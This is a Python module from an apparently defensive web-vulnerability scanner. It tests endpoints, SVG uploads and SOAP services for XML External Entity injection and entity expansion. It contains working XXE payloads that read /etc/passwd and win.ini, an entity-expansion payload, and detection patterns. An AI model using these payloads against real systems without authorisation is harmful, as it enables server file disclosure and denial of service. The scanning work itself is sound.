"""
DAST Check Module — XML External Entity (XXE) Injection.

Active checks that test for XXE vulnerabilities:
  - XXE via XML-accepting endpoints (file disclosure)
  - XXE via SVG file upload
  - XML entity expansion (billion laughs — safe/limited variant)
  - XXE via SOAP endpoints

Rule IDs: DAST-XXE-001 through DAST-XXE-004
"""

from __future__ import annotations

import logging
import re
import time
from typing import TYPE_CHECKING

from ...core.finding import Finding

if TYPE_CHECKING:
    from ...core.credential_manager import CredentialManager
    from ..crawler import SiteMap
    from ..http_client import DastHTTPClient

logger = logging.getLogger(__name__)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Payloads and detection patterns
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

XXE_PASSWD_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
    "<root><data>&xxe;</data></root>"
)

XXE_WININI_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/windows/win.ini"> ]>'
    "<root><data>&xxe;</data></root>"
)

XXE_SVG_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
    '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
)

XXE_ENTITY_EXPANSION = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    "<!DOCTYPE boom ["
    '  <!ENTITY c "SKYHIGH">'
    "  <!ENTITY b "
    '"&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">'
    "  <!ENTITY a "
    '"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">'
    "]>"
    "<root>&a;</root>"
)

XXE_SOAP_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
    '<soapenv:Envelope xmlns:soapenv='
    '"http://schemas.xmlsoap.org/soap/envelope/">'
    "<soapenv:Body><data>&xxe;</data></soapenv:Body>"
    "</soapenv:Envelope>"
)

XXE_FILE_PATTERNS: list[re.Pattern[str]] = [
    re.compile(r"root:.*?:0:0:"),            # /etc/passwd
    re.compile(r"\[fonts\]", re.I),          # win.ini
    re.compile(r"\[extensions\]", re.I),     # win.ini
]

XML_CONTENT_TYPES: frozenset[str] = frozenset({
    "application/xml",
    "text/xml",
    "application/soap+xml",
})

WSDL_PATHS: list[str] = [
    "/service?wsdl",
    "/ws?wsdl",
    "/soap",
    "/services",
    "/service",
    "/api?wsdl",
]


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Helper
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _finding(
    rule_id: str,
    name: str,
    severity: str,
    file_path: str,
    line_content: str,
    description: str,
    recommendation: str,
    cwe: str | None = None,
    evidence: list[dict] | None = None,
) -> Finding:
    return Finding(
        rule_id=rule_id,
        name=name,
        category="xxe",
        severity=severity,
        file_path=file_path,
        line_num=0,
        line_content=line_content,
        description=description,
        recommendation=recommendation,
        cwe=cwe,
        target_type="dast",
        evidence=evidence,
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Checks
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _check_xxe_xml_endpoints(
    client: DastHTTPClient,
    sitemap: SiteMap,
    target_url: str,
    findings: list[Finding],
) -> None:
    """DAST-XXE-001: XXE via XML-accepting endpoints (CRITICAL, CWE-611)."""
    endpoints: set[str] = set()

    # API endpoints discovered during crawl
    for ep in sitemap.api_endpoints:
        endpoints.add(ep.url)

    # Check response headers if available
    response_headers = getattr(sitemap, "response_headers", {})
    for url, headers in response_headers.items():
        ct = (headers.get("Content-Type", "") or "").split(";")[0].strip()
        if ct in XML_CONTENT_TYPES:
            endpoints.add(url)

    for url in list(endpoints)[:15]:
        for payload, payload_desc in (
            (XXE_PASSWD_PAYLOAD, "/etc/passwd"),
            (XXE_WININI_PAYLOAD, "C:/windows/win.ini"),
        ):
            try:
                resp = client.post(
                    url,
                    data=payload,
                    headers={"Content-Type": "application/xml"},
                    capture_evidence=True,
                )
            except Exception as exc:
                logger.debug(
                    "Check %s failed for %s: %s", "DAST-XXE-001", url, exc,
                )
                continue

            for pat in XXE_FILE_PATTERNS:
                if pat.search(resp.text):
                    findings.append(_finding(
                        rule_id="DAST-XXE-001",
                        name=f"XXE file disclosure at: {url}",
                        severity="CRITICAL",
                        file_path=url,
                        line_content=(
                            f"Payload referencing {payload_desc} "
                            "returned file contents"
                        ),
                        description=(
                            f"XML External Entity injection detected at "
                            f"{url}. Posting an XML document with a "
                            f"DOCTYPE referencing {payload_desc} caused "
                            "the server to include file contents in the "
                            "response. An attacker can read arbitrary "
                            "files from the server."
                        ),
                        recommendation=(
                            "Disable external entity processing in the "
                            "XML parser. For Java use "
                            "XMLConstants.FEATURE_SECURE_PROCESSING; for "
                            "Python use defusedxml; for .NET set "
                            "DtdProcessing.Prohibit."
                        ),
                        cwe="CWE-611",
                        evidence=[{
                            "method": "POST",
                            "url": url,
                            "status": resp.status_code,
                            "payload": payload_desc,
                            "proof": resp.text[:500],
                        }],
                    ))
                    return


def _check_xxe_file_upload(
    client: DastHTTPClient,
    sitemap: SiteMap,
    findings: list[Finding],
) -> None:
    """DAST-XXE-002: XXE via SVG file upload (HIGH, CWE-611)."""
    upload_forms = [
        f for f in sitemap.forms
        if f.has_file_upload
    ]

    for form in upload_forms[:5]:
        form_data: dict[str, str] = {}
        file_field_name: str = "file"
        for field in form.fields:
            if field.field_type == "file":
                file_field_name = field.name or "file"
            elif field.field_type == "hidden" and field.value:
                form_data[field.name] = field.value
            elif field.name:
                form_data[field.name] = "test"

        try:
            resp = client.post(
                form.action,
                data=form_data,
                files={
                    file_field_name: (
                        "test.svg",
                        XXE_SVG_PAYLOAD,
                        "image/svg+xml",
                    ),
                },
                capture_evidence=True,
            )
        except Exception as exc:
            logger.debug(
                "Check %s failed for %s: %s",
                "DAST-XXE-002", form.action, exc,
            )
            continue

        for pat in XXE_FILE_PATTERNS:
            if pat.search(resp.text):
                findings.append(_finding(
                    rule_id="DAST-XXE-002",
                    name=f"XXE via SVG upload at: {form.action}",
                    severity="HIGH",
                    file_path=form.url,
                    line_content=(
                        "SVG upload with DOCTYPE entity returned "
                        "file contents"
                    ),
                    description=(
                        f"XXE injection detected via file upload at "
                        f"{form.url} (action: {form.action}). Uploading "
                        "an SVG file containing a DOCTYPE with an "
                        "external entity reference caused server-side "
                        "file disclosure. SVG files are XML-based and "
                        "are commonly overlooked by upload filters."
                    ),
                    recommendation=(
                        "Validate uploaded file contents, not just "
                        "extensions. Strip or reject DOCTYPE declarations "
                        "in uploaded XML/SVG. Use a secure XML parser "
                        "with external entities disabled."
                    ),
                    cwe="CWE-611",
                    evidence=[{
                        "method": "POST",
                        "url": form.action,
                        "status": resp.status_code,
                        "payload": "SVG with XXE entity",
                        "proof": resp.text[:500],
                    }],
                ))
                return


def _check_xxe_entity_expansion(
    client: DastHTTPClient,
    sitemap: SiteMap,
    target_url: str,
    findings: list[Finding],
) -> None:
    """DAST-XXE-003: XML entity expansion / billion laughs (MEDIUM, CWE-776)."""
    endpoints: set[str] = set()
    for ep in sitemap.api_endpoints:
        endpoints.add(ep.url)
    response_headers = getattr(sitemap, "response_headers", {})
    for url, headers in response_headers.items():
        ct = (headers.get("Content-Type", "") or "").split(";")[0].strip()
        if ct in XML_CONTENT_TYPES:
            endpoints.add(url)

    parser_errors: list[re.Pattern[str]] = [
        re.compile(r"entity.*?expan", re.I),
        re.compile(r"XML.*?(?:pars|error|invalid)", re.I),
        re.compile(r"recursion|recursive", re.I),
        re.compile(r"javax\.xml|SAXParseException|lxml\.etree", re.I),
    ]

    for url in list(endpoints)[:5]:
        # Baseline with simple XML
        try:
            t0 = time.monotonic()
            client.post(
                url,
                data="<root>test</root>",
                headers={"Content-Type": "application/xml"},
            )
            baseline = time.monotonic() - t0
        except Exception as exc:
            logger.debug(
                "Check %s baseline failed for %s: %s",
                "DAST-XXE-003", url, exc,
            )
            continue

        # Send entity expansion payload
        try:
            t0 = time.monotonic()
            resp = client.post(
                url,
                data=XXE_ENTITY_EXPANSION,
                headers={"Content-Type": "application/xml"},
                capture_evidence=True,
            )
            elapsed = time.monotonic() - t0
        except Exception as exc:
            logger.debug(
                "Check %s failed for %s: %s", "DAST-XXE-003", url, exc,
            )
            continue

        slow = (elapsed - baseline) > 3.0
        error_match = any(p.search(resp.text) for p in parser_errors)

        if slow or error_match:
            trigger = (
                f"Response {elapsed:.2f}s vs baseline {baseline:.2f}s "
                f"(+{elapsed - baseline:.2f}s)"
                if slow
                else "XML parser error in response"
            )
            findings.append(_finding(
                rule_id="DAST-XXE-003",
                name=f"XML entity expansion at: {url}",
                severity="MEDIUM",
                file_path=url,
                line_content=f"Entity expansion payload — {trigger}",
                description=(
                    f"The endpoint {url} appears vulnerable to XML "
                    "entity expansion (a variant of the billion laughs "
                    f"attack). {trigger}. Even a limited expansion can "
                    "cause Denial of Service by consuming excessive "
                    "memory and CPU on the server."
                ),
                recommendation=(
                    "Disable DTD processing in the XML parser. Set "
                    "entity expansion limits (e.g., "
                    "FEATURE_SECURE_PROCESSING in Java, "
                    "resolve_entities=False in lxml). Use defusedxml "
                    "for Python applications."
                ),
                cwe="CWE-776",
                evidence=[{
                    "method": "POST",
                    "url": url,
                    "status": resp.status_code,
                    "payload": "3-level entity expansion (~1000 entities)",
                    "baseline_time": f"{baseline:.3f}s",
                    "response_time": f"{elapsed:.3f}s",
                    "proof": resp.text[:500],
                }],
            ))
            return


def _check_xxe_soap_endpoints(
    client: DastHTTPClient,
    target_url: str,
    findings: list[Finding],
) -> None:
    """DAST-XXE-004: XXE via SOAP endpoints (HIGH, CWE-611)."""
    base = target_url.rstrip("/")

    for wsdl_path in WSDL_PATHS:
        soap_url = f"{base}{wsdl_path}"
        try:
            probe = client.get(soap_url, capture_evidence=False)
        except Exception as exc:
            logger.debug(
                "Check %s probe failed for %s: %s",
                "DAST-XXE-004", soap_url, exc,
            )
            continue

        if probe.status_code not in (200, 405):
            continue

        try:
            resp = client.post(
                soap_url,
                data=XXE_SOAP_PAYLOAD,
                headers={"Content-Type": "text/xml"},
                capture_evidence=True,
            )
        except Exception as exc:
            logger.debug(
                "Check %s failed for %s: %s",
                "DAST-XXE-004", soap_url, exc,
            )
            continue

        for pat in XXE_FILE_PATTERNS:
            if pat.search(resp.text):
                findings.append(_finding(
                    rule_id="DAST-XXE-004",
                    name=f"XXE via SOAP endpoint: {soap_url}",
                    severity="HIGH",
                    file_path=soap_url,
                    line_content=(
                        "SOAP envelope with DOCTYPE entity returned "
                        "file contents"
                    ),
                    description=(
                        f"XXE injection detected at SOAP endpoint "
                        f"{soap_url}. A SOAP envelope containing a "
                        "DOCTYPE with an external entity reference "
                        "caused the server to disclose file contents. "
                        "SOAP services that accept raw XML are a common "
                        "XXE attack vector."
                    ),
                    recommendation=(
                        "Disable external entity processing in the SOAP "
                        "XML parser. Use a hardened SOAP framework that "
                        "rejects DTDs by default. Validate Content-Type "
                        "and reject requests with DOCTYPE declarations."
                    ),
                    cwe="CWE-611",
                    evidence=[{
                        "method": "POST",
                        "url": soap_url,
                        "status": resp.status_code,
                        "payload": "SOAP envelope with XXE entity",
                        "proof": resp.text[:500],
                    }],
                ))
                return


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Module entry point
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def run_checks(
    client: DastHTTPClient,
    target_url: str,
    sitemap: SiteMap,
    credentials: CredentialManager | None = None,
    verbose: bool = False,
) -> list[Finding]:
    """Run all XXE checks.

    Returns:
        List of Finding objects for any XXE vulnerabilities found.
    """
    findings: list[Finding] = []

    _check_xxe_xml_endpoints(client, sitemap, target_url, findings)
    _check_xxe_file_upload(client, sitemap, findings)
    _check_xxe_entity_expansion(client, sitemap, target_url, findings)
    _check_xxe_soap_endpoints(client, target_url, findings)

    return findings
